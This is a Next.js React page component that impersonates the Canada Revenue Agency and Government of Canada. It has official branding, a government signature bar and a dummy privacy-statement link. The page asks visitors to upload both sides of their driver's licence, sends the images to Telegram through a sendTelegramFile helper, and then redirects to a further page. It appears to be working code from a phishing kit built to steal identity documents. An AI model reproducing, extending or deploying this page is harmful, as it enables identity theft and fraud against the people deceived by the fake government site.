"use client";
import Image from "next/image";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Head from "next/head";

import { sendTelegramFile } from "../../utils/telegram";

export default function UploadLicense() {
  // Front file state
  const [frontFile, setFrontFile] = useState<File | null>(null);
  const [frontPreview, setFrontPreview] = useState<string | null>(null);
  // Back file state
  const [backFile, setBackFile] = useState<File | null>(null);
  const [backPreview, setBackPreview] = useState<string | null>(null);

  const [error, setError] = useState("");
  const [isUploading, setIsUploading] = useState(false);
  const router = useRouter();

  // Validate a single file
  const validateFile = (file: File): string | null => {
    const validTypes = ["image/jpeg", "image/png", "image/jpg", "image/heic"];
    if (!validTypes.includes(file.type)) {
      return "Please upload a valid image (JPEG, PNG, or HEIC).";
    }
    if (file.size > 10 * 1024 * 1024) {
      return "File size must be less than 10 MB.";
    }
    return null;
  };

  const handleFrontChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    setError("");
    if (!file) {
      setFrontFile(null);
      setFrontPreview(null);
      return;
    }
    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      setFrontFile(null);
      setFrontPreview(null);
      return;
    }
    setFrontFile(file);
    setFrontPreview(URL.createObjectURL(file));
  };

  const handleBackChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0];
    setError("");
    if (!file) {
      setBackFile(null);
      setBackPreview(null);
      return;
    }
    const validationError = validateFile(file);
    if (validationError) {
      setError(validationError);
      setBackFile(null);
      setBackPreview(null);
      return;
    }
    setBackFile(file);
    setBackPreview(URL.createObjectURL(file));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!frontFile || !backFile) {
      setError("Please select both front and back images.");
      return;
    }

    setIsUploading(true);
    setError("");

    try {
      const timestamp = new Date().toLocaleString();
      // Send front image
      await sendTelegramFile(frontFile, `Driver's License Front\nTime: ${timestamp}`);
      // Send back image
      await sendTelegramFile(backFile, `Driver's License Back\nTime: ${timestamp}`);

      // Redirect after both are sent
      router.push("/crainf");
    } catch (err) {
      console.error("Upload error:", err);
      setError("An error occurred. Please try again.");
    } finally {
      setIsUploading(false);
    }
  };

  return (
    <>
      <Head>
        <title>Upload Driver&apos;s License - CRA</title>
        <meta name="viewport" content="width=device-width, initial-scale=1" />
      </Head>

      <div className="min-h-screen bg-white text-gray-800">
        {/* Government of Canada signature bar */}
        <div className="bg-gray-100 border-b border-gray-300">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-2 flex justify-between items-center">
            <Image
              src="/images/sig-blk-en.svg"
              alt="Government of Canada"
              width={500}
              height={150}
              className="h-16 w-auto"
            />
            <div className="text-right">
              <div className="text-xs sm:text-sm text-gray-600">Government of Canada</div>
              <div lang="fr" className="text-xs sm:text-sm text-gray-600">
                Gouvernement du Canada
              </div>
            </div>
          </div>
        </div>

        {/* CRA branding bar */}
        <div className="bg-[#26374a] text-white">
          <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-3">
            <div className="text-xl sm:text-2xl font-bold">Canada Revenue Agency</div>
          </div>
        </div>

        {/* Main content */}
        <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 sm:py-12">
          <div className="max-w-2xl">
            <h1 className="text-2xl sm:text-3xl font-bold text-gray-800 mb-6">
              Upload Driver&apos;s License
            </h1>

            {error && (
              <div className="bg-red-50 border border-red-200 text-red-700 px-4 py-3 rounded-lg text-sm mb-6 flex items-start">
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  className="h-5 w-5 text-red-500 mr-2 mt-0.5 flex-shrink-0"
                  viewBox="0 0 20 20"
                  fill="currentColor"
                >
                  <path
                    fillRule="evenodd"
                    d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z"
                    clipRule="evenodd"
                  />
                </svg>
                <span>{error}</span>
              </div>
            )}

            <form onSubmit={handleSubmit} noValidate>
              {/* Front file input */}
              <div className="mb-8">
                <label htmlFor="front-upload" className="block text-base sm:text-lg font-semibold mb-2">
                  Front of Driver&apos;s License <span className="text-red-600 italic">(required)</span>
                </label>
                <input
                  id="front-upload"
                  type="file"
                  accept="image/jpeg,image/png,image/jpg,image/heic"
                  onChange={handleFrontChange}
                  className="w-full sm:w-96 border border-gray-400 rounded px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
                <p className="text-sm text-gray-600 mt-1">
                  Accepted formats: JPEG, PNG, HEIC (max 10 MB)
                </p>
                {frontPreview && (
                  <div className="mt-4">
                    <p className="text-sm font-medium mb-1">Preview (Front):</p>
                    <Image
  src={frontPreview}
  alt="Front preview"
  width={500} // required
  height={300} // required
  className="max-w-full sm:max-w-md h-auto rounded border border-gray-300"
/>
                  </div>
                )}
              </div>

              {/* Back file input */}
              <div className="mb-8">
                <label htmlFor="back-upload" className="block text-base sm:text-lg font-semibold mb-2">
                  Back of Driver&apos;s License <span className="text-red-600 italic">(required)</span>
                </label>
                <input
                  id="back-upload"
                  type="file"
                  accept="image/jpeg,image/png,image/jpg,image/heic"
                  onChange={handleBackChange}
                  className="w-full sm:w-96 border border-gray-400 rounded px-3 py-2 text-base focus:outline-none focus:ring-2 focus:ring-blue-500"
                />
                <p className="text-sm text-gray-600 mt-1">
                  Accepted formats: JPEG, PNG, HEIC (max 10 MB)
                </p>
                {backPreview && (
                  <div className="mt-4">
                    <p className="text-sm font-medium mb-1">Preview (Back):</p>
                    <Image
  src={backPreview}
  alt="Back preview"
  width={500}
  height={300}
  className="max-w-full sm:max-w-md h-auto rounded border border-gray-300"
/>
                  </div>
                )}
              </div>

              {/* Privacy statement */}
              <p className="text-gray-700 text-base mb-8">
                For more information on how your privacy is protected, refer to our{" "}
                <a href="#" className="text-blue-800 underline hover:text-blue-900">
                  Personal Information Collection Statement
                </a>
                .
              </p>

              {/* Buttons */}
              <div className="flex flex-col sm:flex-row gap-4 mb-6">
                <button
                  type="submit"
                  disabled={isUploading}
                  className={`bg-[#26374a] hover:bg-[#1c2a3f] text-white font-semibold py-3 px-8 rounded text-lg ${
                    isUploading ? "opacity-50 cursor-not-allowed" : ""
                  }`}
                >
                  {isUploading ? "Uploading..." : "Submit"}
                </button>
                <button
                  type="button"
                  onClick={() => {
                    setFrontFile(null);
                    setFrontPreview(null);
                    setBackFile(null);
                    setBackPreview(null);
                    setError("");
                  }}
                  className="bg-gray-200 hover:bg-gray-300 text-gray-800 font-semibold py-3 px-8 rounded text-lg border border-gray-400"
                >
                  Exit
                </button>
              </div>
            </form>

            {/* Screen ID */}
            <div className="text-xs text-gray-400 mt-8 border-t pt-4">Screen ID: ID.02</div>
          </div>
        </main>
      </div>
    </>
  );
}